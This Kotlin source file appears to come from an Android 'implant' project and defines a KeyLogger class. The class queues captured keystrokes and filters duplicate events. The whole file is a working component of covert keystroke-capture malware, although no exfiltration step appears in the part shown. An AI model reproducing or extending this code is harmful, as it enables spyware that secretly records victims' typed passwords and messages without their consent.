package com.cooperthecoder.implant

import java.util.*
import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.atomic.AtomicLong

class KeyLogger(val callback: (String) -> Unit) {

    val keystrokes: Queue<String> = ConcurrentLinkedQueue<String>()
    val lastEvent = AtomicLong(0)

    fun recordKeystroke(keystroke: String, time: Long) {
        // Avoid duplicate events from Android
        val last = lastEvent.get()
        if (time - last < Config.KEY_PRESS_TIMEOUT) {
            return
        }

        lastEvent.set(time)
        when (keystroke) {
            else -> {
                keystrokes.add(keystroke)
            }
        }
    }
}